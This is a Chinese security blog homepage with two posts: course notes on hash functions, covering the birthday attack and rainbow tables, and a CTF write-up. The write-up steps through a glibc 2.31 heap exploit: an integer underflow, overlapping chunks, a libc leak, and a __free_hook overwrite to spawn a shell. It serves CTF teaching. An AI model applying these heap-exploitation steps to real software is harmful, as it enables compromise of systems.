<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s Pwnhome">
<meta property="og:url" content="http://hornos3.github.com/index.html">
<meta property="og:site_name" content="CoLin&#39;s Pwnhome">
<meta property="og:locale">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh'
  };
</script>

  <title>CoLin's Pwnhome</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's Pwnhome</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94Hash%E5%87%BD%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94Hash%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">密码学基础 Chapter 4——Hash函数</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:24" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:24+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="4-1-数据完整性"><a href="#4-1-数据完整性" class="headerlink" title="4.1 数据完整性"></a>4.1 数据完整性</h1><p>信息安全的三个要点：机密性、完整性、可用性<br>被动攻击：攻击者只能监听；主动攻击：攻击者可能会干扰通信</p>
<ul>
<li>数据完整性是对抗对消息未授权修改的安全服务</li>
<li>有些应用不需要机密性<br>解决完整性问题：添加冗余</li>
<li>对称技术：Hash函数（散列函数），报文鉴别码（MAC）</li>
<li>非对称技术：数字签名</li>
</ul>
<h2 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h2><p>H(M)作用于一个任意长度的消息M，返回固定长度（通常超过128比特）的散列值h：<br>h&#x3D;H(M)</p>
<ul>
<li>有时也称为摘要函数、散列函数或杂凑函数</li>
<li>h也被称为消息或数据的“摘要”或“指纹”</li>
<li>带密钥的Hash函数：可以将h和M一起在不安全的信道中传输</li>
<li>不带密钥的Hash函数：h必须安全存放以保证h不被篡改</li>
</ul>
<p>作用：</p>
<ul>
<li>口令保护</li>
<li>构造报文鉴别码HMAC</li>
<li>数字签名</li>
<li>伪随机数生成器</li>
</ul>
<p>要求：</p>
<ul>
<li>快速：给定M，很容易计算h</li>
<li>单向：给定h，根据H(M)&#x3D;h无法计算出M</li>
<li>防碰撞：给定M，要找到另一条消息M’并满足二者摘要相等困难或找到任意两个具有相同散列值的不同消息困难</li>
</ul>
<p>假定h：X→Y，|X|≥|Y|，设x∈X，定义y&#x3D;h(x)</p>
<ul>
<li>单向性（原像稳固性）：给定摘要y，找到x使得h(x)&#x3D;y困难</li>
<li>第二原像稳固性：给定消息x∈X，找到一个x’∈X且x’≠x，使得h(x)&#x3D;h(x’)困难</li>
<li>碰撞稳固性：对于任意x，x’∈X，找到x≠x’且h(x)&#x3D;h(x’)的二元组(x，x’)困难</li>
</ul>
<p>理想的Hash函数应该满足：对于给定的x，只能通过函数h计算得到h(x)的值，而无法通过其他条件得到；已知h(x<del>1</del>)，h(x<del>2</del>)，…，无法间接推出h(x)，其中x与x<del>1</del>，x<del>2</del>，…均不相等</p>
<h2 id="随机预言机ROM"><a href="#随机预言机ROM" class="headerlink" title="随机预言机ROM"></a>随机预言机ROM</h2><ul>
<li>提供“理想”Hash函数的数学模型</li>
<li>确定性、有效性和均匀输出</li>
</ul>
<p>令$F^{X,Y}$是所有从X到Y的函数集合，假定|X|&#x3D;N，|Y|&#x3D;M，随机从$F^{X,Y}$中选择一个Hash函数h：X→Y，对于任意的输入x，其输出值为均匀的，计算h(x)的唯一方法是询问随机预言机。</p>
<p>定理：假定$h\in F^{X,Y}$随机选择，令$X_0\in X$，假定当且仅当$x\in X_0$时。h(x)被确定，则对所有的$x\in X \backslash X_0,y\in Y$都有$Pr[h(x)&#x3D;y]&#x3D;\frac{1}{M}$</p>
<h2 id="原像问题"><a href="#原像问题" class="headerlink" title="原像问题"></a>原像问题</h2><p>Find - Preimage(h, y, Q)<br>选择任意的$X_0\subseteq X,|X_0|&#x3D;Q$<br>for each x∈X<del>0</del><br>do: if h(x)&#x3D;y then return(x)<br>return (failure)</p>
<p>对于任意的$X_0\subseteq X,|X_0|&#x3D;Q$，算法的平均成功率为$\varepsilon&#x3D;1-(1-\frac{1}{M})^{Q}$</p>
<p>证明：给定y∈Y，令X<del>0</del>&#x3D;{x<del>1</del>，x<del>2</del>，…，x<del>Q</del>}<br>对于1≤i≤Q，有$Pr[E_i]&#x3D;\frac{1}{M}$<br>则有$Pr[E_1 \vee E_2 \vee … \vee E_Q]&#x3D;1-(1-\frac{1}{M})^Q$<br>对于任意给定的y的成功率是常数，故结论成立。Q远小于M，故$\varepsilon\approx\frac{Q}{M}$（舍弃了后面的M^-1^的高次项）</p>
<h2 id="第二原像问题"><a href="#第二原像问题" class="headerlink" title="第二原像问题"></a>第二原像问题</h2><p><strong>拉斯维加斯算法</strong><br>Find - Second - Preimage(h, y, Q)<br>y&#x3D;h(x)<br>选择$X_0\subseteq X\backslash{x},|X_0|&#x3D;Q-1$<br>for each x<del>0</del>∈X<del>0</del><br>do: if h(x<del>0</del>)&#x3D;y then return(x<del>0</del>)<br>return failure</p>
<p>对于任意的$X_0\subseteq X\backslash{x},|X_0|&#x3D;Q-1$，算法的成功率为$\varepsilon&#x3D;1-(1-\frac{1}{M})^{Q-1}$</p>
<h2 id="碰撞问题"><a href="#碰撞问题" class="headerlink" title="碰撞问题"></a>碰撞问题</h2><p><strong><font color=red>生日攻击</font></strong><br>Find - Collision(h, Q)<br>选择任意的$X_0\subseteq X,|X_0|&#x3D;Q$<br>for each x∈X<del>0</del><br>do y<del>x</del>&#x3D;h(x)<br>if 对某一x’∈X，有y<del>x</del>&#x3D;y<del>x’</del><br>then return (x,x’)<br>else return (failure)</p>
<p>对于任意的$X_0\subseteq X,|X_0|&#x3D;Q$，算法平均成功率为<br>$$\varepsilon&#x3D;1-(\frac{M-1}{M}\frac{M-2}{M}…\frac{M-Q+1}{M})$$<br>$$Q\approx\sqrt{2M\ln\frac{1}{1-\varepsilon}}$$</p>
<p>证明：<br>$$\varepsilon&#x3D;1-(\frac{M-1}{M}\frac{M-2}{M}…\frac{M-Q+1}{M})\<br>\approx\prod_{i&#x3D;1}^{k-1}e^{-\frac{i}{M}}&#x3D;e^{-\frac{k(k-1)}{2M}}$$</p>
<p><font color=red>对一个输出空间大小为M的随机函数，只需要计算大约$\sqrt{M}$个函数值就能够以一个不可忽略的概率发现一个碰撞。因此Hash函数的输出空间大小必须有一个下界。</font></p>
<h2 id="安全性准则的比较"><a href="#安全性准则的比较" class="headerlink" title="安全性准则的比较"></a>安全性准则的比较</h2><p>Collision - To - Second - Preimage(h)<br>external Oracle - 2nd - Preimage<br>均匀随机选择x∈X<br>if Oracle - 2nd - Preimage(h,x)&#x3D;x’<br>then return (x,x’)<br>else return (failure)</p>
<p>碰撞问题可以归约到第二原像问题，因此可以说碰撞稳固性质意味着第二原像稳固性质。</p>
<p>Collision - To - Preimage(h)<br>external Oracle - Preimage<br>均匀随机选择x∈X<br>y←h(x)<br>if (Oracle - Preimage(h, y)&#x3D;x’) and (x≠x’)<br>then return (x, x’)<br>else return (failure)</p>
<p>定理4.5 假定h: X→Y是一个Hash函数，其中|X|和|Y|有限且|X|≥2|Y|。假定Oracle - Preimage对固定的hash函数是原像问题中的一个(1, Q)算法，则Collision - To - Preimage对固定的Hash函数时碰撞问题的一个(1&#x2F;2, Q+1)算法</p>
<p><strong>使用随机预言机模型中理想Hash函数是困难的，可以参考一些分组密码理论构造尽可能接近理想特性的Hash函数。（混乱、扩散、随机）</strong>。可以基于数学难题构造方法，但计算速度慢，不实用。因此可以使用对称密码体制来设计Hash函数，或者直接设计。</p>
<h1 id="4-2-常用Hash函数"><a href="#4-2-常用Hash函数" class="headerlink" title="4.2 常用Hash函数"></a>4.2 常用Hash函数</h1><p>Hash函数通用结构：迭代结构</p>
<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h3><p>最后一块的最后8个字节（64bits）保存的是输入的长度。如果消息正好是分块的整数倍，仍然需要填充一整块，其中前面为10000…（填充内容），后面为输入长度。如果消息过长（大于2^64 bits），则将消息模2^64（仅取低64位）计算MD5。（消息长度为小端序）</p>
<h3 id="压缩初始化"><a href="#压缩初始化" class="headerlink" title="压缩初始化"></a>压缩初始化</h3><p>初始化4个字寄存器，填入CV<del>0</del>（0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476，固定不变）</p>
<h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p><img src="https://img-blog.csdnimg.cn/5c02205ea8124707a8b829cd44f5acc5.jpeg"><br>$$F(B,C,D)&#x3D;(B\land C)\vee(\lnot B\land D)\<br>G(B,C,D)&#x3D;(B\land C)\vee(C\land\lnot D)\<br>H(B,C,D)&#x3D;B\oplus C\oplus D\<br>I(B,C,D)&#x3D;C\oplus(B\vee\lnot D)$$</p>
<h2 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h2><h3 id="填充-1"><a href="#填充-1" class="headerlink" title="填充"></a>填充</h3><p>与MD5基本相同，不同的是SHA1最后的输入长度为<strong>大端序</strong>而MD5为小端序</p>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>一共执行80步后输出<br><img src="https://img-blog.csdnimg.cn/9ff6ceb6be5e44ea9d3cb3bcb07541a7.jpeg"><br>$$F_1&#x3D;(B\land C)\vee(\lnot B\land D)\<br>F_2&#x3D;B\oplus C\oplus D\<br>F_3&#x3D;(B\land C)\vee(B\land D)\vee(C\land D)$$<br>其中F<del>1</del>用于第0-19步，F<del>2</del>用于第20-39、60-79步，F<del>3</del>用于第40-59步</p>
<p>$$W_t&#x3D;\left{\<br>\begin{array}{c}<br>Y_i[t], 0\le t\le 15\<br>S^1(W_{t-16}\oplus W_{t-14}\oplus W_{t-8}\oplus W_{t-3})，t\ge 15<br>\end{array}<br>\right.$$</p>
<p>$$K_t&#x3D;\left{\<br>\begin{array}{c}<br>\operatorname{0x}5A827999, 0\le t\le 19\<br>\operatorname{0x}6ED9EBA1, 20\le t\le 39\<br>\operatorname{0x}8F1BBCDC, 40\le t\le 59\<br>\operatorname{0x}CA62C1D6, 60\le t\le 79\<br>\end{array}<br>\right.$$</p>
<h2 id="二者比较"><a href="#二者比较" class="headerlink" title="二者比较"></a>二者比较</h2><p>摘要长度：寻找原像与碰撞<br>速度：SHA1速度慢于MD5<br>简洁与紧致性：描述和实现都较为简单，无需更大代换表<br>数据存储方式：小端序和大端序<br>安全性：SHA1优于MD5</p>
<h2 id="SM3"><a href="#SM3" class="headerlink" title="SM3"></a>SM3</h2><ul>
<li>遵循通用迭代结构</li>
<li>输出为256比特的摘要，消息长度小于2^64^，按照512比特分组</li>
<li>过程包括填充和迭代压缩，填充方式与MD5相同</li>
<li>压缩函数使用8个字寄存器，大端序存储，同SHA1，一共执行64步</li>
<li>输出为160bit</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/d8d7045778594a629394835bd3fade4f.jpeg"><br>压缩函数：将Y<del>i</del>扩展为132个字用于压缩函数CF（ABCDEFGH）<br><img src="https://img-blog.csdnimg.cn/d5d7ad7ca4c94e8098afe1eb7ec511fa.jpeg"><br><img src="https://img-blog.csdnimg.cn/6ee742c19b8b4d2280f9918e3d5a5639.jpeg"></p>
<h2 id="SHA3"><a href="#SHA3" class="headerlink" title="SHA3"></a>SHA3</h2><p>采用海绵结构，可以实现任意长度的输入和输出<br><img src="https://img-blog.csdnimg.cn/01879eddd7944f708d621d67f27eaa70.jpeg"></p>
<h3 id="填充-2"><a href="#填充-2" class="headerlink" title="填充"></a>填充</h3><p>首尾填充1，中间填充0，整数倍也要填充</p>
<p>$\forall n\ge 0,\forall M,M’\in(Z_2)^*:M\ne M’\Rightarrow M||pad[r]\ne M’||pad[r]||0^{nr}$<br>即若原来的明文不一样，填充完之后应该也不一样。<br><img src="https://img-blog.csdnimg.cn/7bf1fcee139d463eaa398f8376b49bd4.jpeg"><br><img src="https://img-blog.csdnimg.cn/4a77fdafdedf4a4abc67b859b858d61a.jpeg"><br><img src="https://img-blog.csdnimg.cn/17ff061b1fe84339affa624aabcfbbfd.jpeg"><br><img src="https://img-blog.csdnimg.cn/6de81aa60bf449aa8995e298efa93889.jpeg"><br><img src="https://img-blog.csdnimg.cn/450696ea714f4cf982e47753a9c07e35.jpeg"><br><img src="https://img-blog.csdnimg.cn/418025d8c0ec4bf4b5a5f129e723c9c5.jpeg"></p>
<h2 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h2><p>报文校验码，满足某些安全性质的带密钥的Hash函数，功能是保证数据完整性以及数据源认证<br>可以通过不带密钥的Hash函数构造：HMAC<br>也可通过对称密钥算法构造：CBC-MAC</p>
<p>ipad &#x3D; 3636…36<br>opad &#x3D; 5c5c…5c</p>
<p>HMAC<del>K</del>(x)&#x3D;SHA-1((K$\oplus$opad)||SHA-1((K$\oplus$ipad)||x))【||表示连接】<br>通过嵌套Hash函数以保证MAC的安全性。一旦结构安全，则可以替换其中的Hash函数</p>
<p>CBC-MAC(x,k)<br>令x&#x3D;x<del>1</del>||…||x<del>n</del><br>IV←00…0<br>y<del>0</del>←IV<br>for i&#x3D;1 to n<br>do y<del>i</del>&#x3D;e<del>k</del>(y<del>i-1</del>$\oplus$x<del>i</del>)<br>return y<del>n</del><br>加密算法具有混乱特性，当基本加密算法满足合适的安全性质时，CBC-MAC是安全的</p>
<p>CCM模式：CTR+CBC-MAC<br>T<del>i</del>&#x3D;ctr+i mod 2^m^，x&#x3D;x<del>1</del>||…，y<del>i</del>&#x3D;e<del>k</del>(T<del>i</del>)$\oplus$x<del>i</del><br>temp &#x3D; CBC-MAC(x, K)，y’ &#x3D; T<del>0</del>$\oplus$temp，y&#x3D;y<del>1</del>||y<del>2</del>||…||y’</p>
<p><strong>攻击方式</strong>：</p>
<ul>
<li>暴力破解</li>
<li>字典攻击（针对于口令）</li>
<li>彩虹表<br>对随机口令取哈希值，再通过一个从Hash值空间到口令空间均匀分布的函数R，获取到这个口令Hash取函数R后的另一个口令。如此进行下去可以获取到一个口令-Hash-口令-Hash-……的链，可以获取多个这样的链，在存储时只需要存储每条链的第一个和最后一个口令即可，可以大大节省存储空间。<br>如果哈希值为H的口令不是P<del>i,j</del>中的任何一个，那么在这条链上一定找不到<br>如果彩虹表链长上界为n，若Hash值为H<del>0</del>的口令是P<del>i,j</del>中的某一个，最多n次运算后能够使得P<del>i</del>等于彩虹表中某条链的链尾<br>为了防止不同链的碰撞，需要使用多个R函数<br>Cain，RainbowCrack等免费使用的公用彩虹表，但主流支持10字符一下的口令。采用salt（盐值）能够有效对抗彩虹表</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/starCTF-2022-examination-%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/starCTF-2022-examination-%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">_CTF-2022 examination 题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:23 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:23+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>源文件：<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">my_github</a></p>
<p>这是一道堆题，模拟了学生和老师的有趣生活。</p>
<p>在这里，老师能干的事情有：添加学生、评分（分数随机，通常不超过10分）、为某一个学生写评语、叫家长（删除学生）。学生能干的事情有：做题（在本赛题中没有用）、查看评语、祈祷、设置模式（在本赛题中没有用）、修改要操作的学号。其中学生祈祷后，老师评分时能够发现，并吐槽一下，额外减10分。如果学生查看自己的分数发现大于89分，则可以获得奖励：获取到该学生信息的堆块地址，以及对任意地址的值加1（这种奖励每位学生只能获得一次）。</p>
<p>首先，我们需要发现一个整型漏洞。注意到祈祷之后评分会额外扣10分，如果本来没有10分，扣除之后就成了负数。看一下汇编，这里的跳转指令用的是jbe，也就是无符号整数的比较，这样就形成了一个整型漏洞。扣这10分之后，我们就可以进行任一地址加1的操作了。这是本题中最为关键的操作，没有之一。</p>
<p><img src="https://img-blog.csdnimg.cn/7ab5d28b0cb34cb0876b8a57be36c69c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /></p>
<p>在本题中，首先我们要获取libc的加载地址，好定位system函数。由于本题使用的glibc版本为2.31，因此任何小于0x400的chunk在释放时都会被存储到tcache中，而tcache chunk中并不包含任何glibc的偏移地址。这样，我们是无法知道glibc的偏移的。要想获得glibc地址，我们需要让一个chunk进入unsorted bin。这就需要使这个chunk的大小超过0x400。我们手中能用的手段只有任一地址加1，因此顺理成章地我们可以将这里的地址改大为0x500，这样就能够获得一个unsorted bin chunk了。</p>
<p>但是，如果仅仅是单纯地这样修改，我们仍然无法对这个chunk进行有效地控制。因为free意味着删除学生，程序中删除学生会将对应位置的悬挂指针清零，使我们看上去失去了UAF的可能性。但是别忘了，任一地址加1也是一个很好的攻击武器。如果我们通过任意地址加1能够修改一个学生评语的指针，那会怎么样呢？我们可以让两个学生的评语指向同一个位置，这样就实现了UAF。</p>
<p>经过实际验证，发现本程序中有很多需要注意的细节问题，需要把握好这些细节才能够拿到shell，否则程序容易崩溃退出。</p>
<p><strong>1. 学生数量问题</strong></p>
<p><img src="https://img-blog.csdnimg.cn/46fcd1a1c830478d8ed72bda9505b35d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /></p>
<p>从添加学生的程序中看出，学生最多只能有7个，而删除学生能够让计数器减1。</p>
<p><strong>2. 评分问题</strong></p>
<p><img src="https://img-blog.csdnimg.cn/644448d3bdcf41e1a19005d7ca2069ba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /></p>
<p>在评分的函数中，我们发现了一个程序bug。</p>
<p>假如我们现在已经有了7名学生，删除第1名学生，其指针会变成空指针，计数器的值应为6。但是评分遍历时还是会遍历到第1名学生，就会导致段错误。为了防止这种情况的发生，我们每一次删除一名学生都必须删除最后一名学生。</p>
<p><strong>3. 地址写</strong></p>
<p><img src="https://img-blog.csdnimg.cn/46aa8f0bd0dd40cda20a199e969ad3b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /></p>
<p>在任意地址写程序中，我们需要输入一个地址的10进制数。但是出题人在处理这个10进制数的时候没有处理好。本来read函数读取到换行结束，出题人应该是想把换行改成空字符，但是很不巧的是他改错了，将最后一位数字改成了空字符。这就需要我们每一次输入地址的时候都要在后面多输入一位无效数字，在比赛的时候这个小bug造成了一些不必要的时间浪费。<s>（屑出题人）</s></p>
<p><strong>4. calloc</strong></p>
<p>本题中除了teacher端输入6调用了一个malloc之外，其他的内存分配均使用calloc，而calloc不会分配tcache中的chunk。</p>
<p>注意到上面的限制条件之后，我们可以对步骤细化：</p>
<p>Step 1: 构造学生4的评语在学生5、6评语之后，绕过删除评语5的检查<br />
Step 2: 奖励学生4，将学生5、6的评语（原大小：0x400）指向同一位置<br />
Step 3: 奖励学生6，使学生6评语大小改大0x100（利用学生6的奖励机会）<br />
Step 4: 删除学生6<br />
Step 5: 读取学生5评语获取libc地址<br />
Step 6: 将学生6添加回来<br />
Step 7: 用学生5覆写学生6的chunk指针到__free_hook<br />
Step 8: 为学生6写评语’/bin/sh’<br />
Step 9: 在__free_hook写入system地址<br />
Step 10: 用学生5覆写学生6的chunk指针返回到原来的位置<br />
Step 11: 删除学生6，getshell</p>
<p>这里需要明确一点：在glibc 2.31的地盘，想要分配一个chunk到__free_hook是一件很难的事情。因为在分配前会对目标地址进行一系列的检查，具体参见我的how2heap学习第9篇文章。由于本题使用calloc作为内存分配函数，因此将tcache指针指向__free_hook也是无效的。因此，本题需要转换思路，直接修改写入评语的地址到__free_hook，即上述第7步。</p>
<p>在上面的思路中，第10步运用了calloc函数的特性，需要我们对本程序堆内存的分配情况有充分的了解，下面进行解释：</p>
<p>在bss段有一个长度为7的数组，存放学生信息的chunk指针，为描述方便，将这个数组中指针指向的chunk称为pointer chunk。每一个pointer chunk的大小均为0x30，其中只保存一个堆chunk指针，这个chunk指针指向的chunk保存的是该学生的分数、是否已经领取奖励的标志位、评语的chunk（以下称comment chunk）、评语chunk的长度等信息，大小为0x20，称其为header chunk（实际分配为0x18，最后8字节与后一个chunk的prev_size重合）。由于每一次添加学生时，两个chunk先后被分配，因此在一开始，不妨将7个学生均分配一次，这样堆空间中就会存在7个这样的结构：</p>
<p><img src="https://img-blog.csdnimg.cn/47570d12b0f440b0a78f2908179aa23d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /><br />
在后面，是我们申请的评语的chunk，一开始我们会申请3个评语chunk，大小分别为0x100,0x400,0x200，分别给学生5,6,4。其中学生5分配0x100是为了后续步骤中将学生5的评语指针修改至与学生6重合。</p>
<p><img src="https://img-blog.csdnimg.cn/03b237767d3c464f992de8ce5e32d9f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_16,color_FFFFFF,t_70,g_se,x_16" alt="" /></p>
<p>由于在后期将学生6的chunk size改大0x100后需要free，因此在学生4的comment chunk中需要进行一定的构造以绕过检查。在学生4的comment chunk对应位置构造假chunk，这个假chunk头应该在学生6的comment chunk扩大0x100后其尾部的正后方，也即学生4 comment chunk头部向后偏移0x100处，构造如下内容：</p>
<p><img src="https://img-blog.csdnimg.cn/c15c37fbb0ae4c859c665d8bc09d5671.png" alt="" /></p>
<p>这两个假chunk可用于绕过_int_free函数的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4316</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// line 4320</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>在此之后，将学生5的comment chunk指针改到学生6的comment chunk可写头部，将学生6的comment chunk改大0x100后释放。</p>
<p><img src="https://img-blog.csdnimg.cn/692219559d174410aaa772e7f3829ae4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="" /></p>
<p>此时，我们使用stu5的指针可以获取到stu6 comment chunk的libc地址，因为此时这个chunk大小为0x500，在unsorted bin中。<br />
之后将stu6申请回来，由于calloc不会使用tcache，因此在comment chunks上方被释放到tcache中原stu6的pointer chunk和header chunk均不会被分配出来，而是会对stu6的comment chunk进行切割，从而也就能够使我们能通过stu5的指针对stu6的信息进行随意改写。我们先对stu6写评语：‘/bin/sh’，这个地址我们可以得到，就在stu6的header chunk之上，我们首先将计算得到的__free_hook地址写到stu6的header chunk中存放comment chunk指针的地方，这样可以在对stu6写评语时直接修改__free_hook的值。然后再对stu5写评语将stu6的comment chunk指针改回到原先写有’/bin/sh’的地方，再执行free函数即可getshell。</p>
